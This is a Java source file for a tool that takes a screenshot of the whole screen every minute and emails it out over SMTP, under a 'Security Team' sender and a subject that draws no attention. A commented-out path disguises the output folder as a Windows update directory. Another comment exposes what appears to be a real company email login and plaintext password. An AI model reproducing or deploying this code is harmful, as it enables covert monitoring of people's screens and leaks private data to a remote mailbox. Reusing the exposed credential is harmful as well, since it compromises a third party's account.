package tools;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.Inet4Address;
import java.net.UnknownHostException;

import javax.imageio.ImageIO;

import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.joda.time.DateTime;
import org.quartz.Job;
import org.quartz.JobBuilder;
import org.quartz.JobDetail;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.Scheduler;
import org.quartz.SchedulerException;
import org.quartz.SimpleScheduleBuilder;
import org.quartz.Trigger;
import org.quartz.TriggerBuilder;
import org.quartz.impl.StdSchedulerFactory;



public class ScreenTaker implements Job{
	
	private String IP;
	private String HostName;
	private Robot robot;
	private String os;
	
	//private static String mac_path="//home//";
	//private static String win_path="c:\\windows_update\\log\\";
	
	private String path;
	private String email_to_send;
	private String email_usr;
	private String email_pwd;
	private String domain;
	private int port;
	
	private File output;
	private String date;

	private int interval;
	
	
	public ScreenTaker(){
		try {
			IP = Inet4Address.getLocalHost().getHostAddress();
			HostName = Inet4Address.getLocalHost().getHostName();
			robot = new Robot();
			os = System.getProperties().getProperty("os.name");
			
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public boolean captureLocal(){
		
		return true;
	}

	public BufferedImage capture(){
		return robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
	}

	public String getIP() {
		return IP;
	}

	public void setIP(String iP) {
		IP = iP;
	}

	public String getHostName() {
		return HostName;
	}

	public void setHostName(String hostName) {
		HostName = hostName;
	}
	
	
	 public static void main(String[] args){
		 
		 int args_size = args.length;
		 
		 
		 switch (args_size) {
			case 0:
				break;
			case 1:
				
			case 2:
				
			case 3:

			default:
				break;
			}
		 
		 
		 try {
			Scheduler scheduler = StdSchedulerFactory.getDefaultScheduler();	
			scheduler.start();
			JobDetail job = JobBuilder.newJob(ScreenTaker.class).build();
			Trigger trigger = TriggerBuilder.newTrigger().withIdentity("trigger","group1")
					.withSchedule(SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(60).repeatForever())
					.build();
			scheduler.scheduleJob(job,trigger);
			//scheduler.shutdown();

		} catch (SchedulerException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 
		 	 
	 }

	@Override
	public void execute(JobExecutionContext arg0) throws JobExecutionException {
		// TODO Auto-generated method stub
		date = DateTime.now().toString();
		createScreenshot();
		buildEmail();
		
	}

	private void createScreenshot() {
		try {
			output = new File(path+getIP()+".jpg");
			ImageIO.write(capture(),"jpg", output);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
		
	}

	public String getPath() {
		return path;
	}

	public void setPath(String path) {
		this.path = path;
	}

	public String getEmail_to_send() {
		return email_to_send;
	}

	public void setEmail_to_send(String email_to_send) {
		this.email_to_send = email_to_send;
	}

	public String getEmail_usr() {
		return email_usr;
	}

	public void setEmail_usr(String email_usr) {
		this.email_usr = email_usr;
	}

	public String getEmail_pwd() {
		return email_pwd;
	}

	public void setEmail_pwd(String email_pwd) {
		this.email_pwd = email_pwd;
	}

	public String getDomain() {
		return domain;
	}

	public void setDomain(String domain) {
		this.domain = domain;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public File getOutput() {
		return output;
	}

	public void setOutput(File output) {
		this.output = output;
	}

	public String getDate() {
		return date;
	}

	public void setDate(String date) {
		this.date = date;
	}

	private void buildEmail() {
		// TODO Auto-generated method stub
		MultiPartEmail email = new MultiPartEmail();
		email.setHostName(getDomain()); //smtp.sunset.com.mx
		email.setSmtpPort(getPort()); //587
		email.setAuthentication(getEmail_usr(),getEmail_pwd()); //"eosorio@sunset.com.mx","Sys73xrv21"
		try {
			/*email.addTo("eosorio@sunset.com.mx");
			*/
			
			email.addTo(getEmail_to_send());
			email.setFrom("security@sunset.com.mx","Security Team");
			email.setSubject("Security File");
			email.setMsg("Security log from : ->>>>"+ getIP()+" --> "+ date);
			email.attach(output);
			email.send();
			
		} catch (EmailException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public String getOs() {
		return os;
	}

	public void setOs(String os) {
		this.os = os;
	}

	
}
